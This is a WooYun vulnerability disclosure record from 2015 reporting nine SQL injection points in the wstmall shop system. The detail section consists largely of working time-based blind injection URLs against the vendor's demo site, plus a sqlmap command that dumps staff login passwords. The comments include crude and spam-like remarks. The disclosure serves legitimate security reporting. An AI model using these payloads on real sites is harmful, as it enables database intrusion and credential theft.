{"id": 70563, "wybug_id": "wooyun-2015-0135248", "wybug_title": "wstmall商城系统sql注入（9处打包demo演示）", "wybug_corp": "wstmall", "wybug_author": "不能忍", "wybug_date": "2015-08-19 17:51", "wybug_open_date": "2015-10-03 17:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-19：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-10-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： tp框架，php5.3版本，无视gpc，有些是盲注有些不是。全部没过滤 详细说明：  案例：百度一下：powered by wstmall我就不贴代码了，厂商自己找把，都很简单。http://demo.wstmall.com/index.php/home/goods_cats/querybylist/?id=1)  AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'--http://demo.wstmall.com/index.php/home/areas/getAreaAndCommunitysByList/?areaId=1)  AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'--http://demo.wstmall.com/index.php/Home/orders/orderCancel/?orderId=1  AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'--http://demo.wstmall.com/index.php/Home/orders/checkOrderPay/?orderIds=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23http://demo.wstmall.com/index.php/Home/orders/orderConfirm/?orderId=1 AND  (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'--http://demo.wstmall.com/index.php/home/payments/getAlipayURL/?orderIds=1000000013&payCode=1%27) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23//要求orderIds=1000000013时orderStatus必须大于0上面这些都是盲注，请在demo站注册之后提交。下面这几处请在sqlmap下测试，不是盲注，但是回显不在网页上，回显数据是json要用抓包工具才能看到（这里表示sqlmap强大。。），由于数据包比较复杂我这里就不抓包演示了，sqlmap把！http://demo.wstmall.com/index.php/Home/payment/topay/?orderIds=1*http://demo.wstmall.com/index.php/Home/payments/topay/?orderIds=1*http://demo.wstmall.com/index.php/Home/orders/getorderinfo/?orderId=1*./sqlmap.py -u \"http://demo.wstmall.com/index.php/Home/payment/topay/?orderIds=1*\" --cookie=\"注入的时候记得把登录的cookie传过来，不然没法注入\" --threads 10 --batch -D wstmall -T wst_staffs -C loginpwd,staffname --dump   漏洞证明：  这里只演示一处sql盲注了，其他请到demo站注册个帐号演示，都很简单的。\n\n   修复方案：  过滤   版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-09-07 07:29 |    \t\t百家乐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 时时彩-百家乐-澳门XXXXXXX)\t\t \n  make    \n     2015-09-07 07:30 |    \t\t百家乐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 时时彩-百家乐-澳门XXXXXXX)\t\t \n  楼主方便私信下QQ吗    \n     2015-09-07 09:53 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:37        | 要工作了。)\t\t \n  @百家乐 不方便，除非你食屎！    \n     2015-09-07 09:56 |    \t\t百家乐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 时时彩-百家乐-澳门XXXXXXX)\t\t \n  @不能忍 一起食如何？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}